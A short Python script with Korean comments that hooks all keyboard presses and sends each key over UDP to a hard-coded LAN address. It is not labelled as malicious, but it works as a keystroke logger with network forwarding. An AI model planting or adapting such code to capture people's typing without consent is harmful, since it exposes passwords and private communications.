import socket
import keyboard
#Tools->open system shell->pip install keyboard
# UDP 소켓 생성
UDP_IP = '172.16.2.135' # 전송할 IP 주소 입력
UDP_PORT = 5000 # 포트번호 설정
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 키보드 입력을 처리하는 함수
def press_keyboard(key):
    try:
        # 누른 키를 문자열로 변환하여 데이터에 추가
        data = str(key)
        # 데이터 전송
        sock.sendto(data.encode(), (UDP_IP, UDP_PORT))
    except :
        pass

# 키 입력 모니터링 시작
keyboard.on_press(press_keyboard)

# 프로그램 실행
while True:
    pass